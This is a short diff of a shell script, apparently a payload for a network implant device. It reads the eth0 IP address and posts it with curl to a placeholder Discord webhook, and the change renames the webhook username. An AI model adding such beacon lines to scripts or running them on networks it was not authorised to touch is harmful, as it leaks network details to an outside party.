@@ -21,7 +21,7 @@ LASTOCTET=$(ifconfig eth0 | grep "inet addr" | awk {'print $2'} | awk -F. {'prin
 ADDRESS=$(ifconfig eth0 | grep "inet addr" | awk {'print $2'}) > ip.txt
 
 # Put Discord Webhook here
-curl -F "payload_json={\"username\": \"Tremor\", \"content\": \""$ADDRESS"\"}" DISCORDWEBHOOK
+curl -F "payload_json={\"username\": \"Sharktato\", \"content\": \""$ADDRESS"\"}" DISCORDWEBHOOK
 
 LED OFF
 
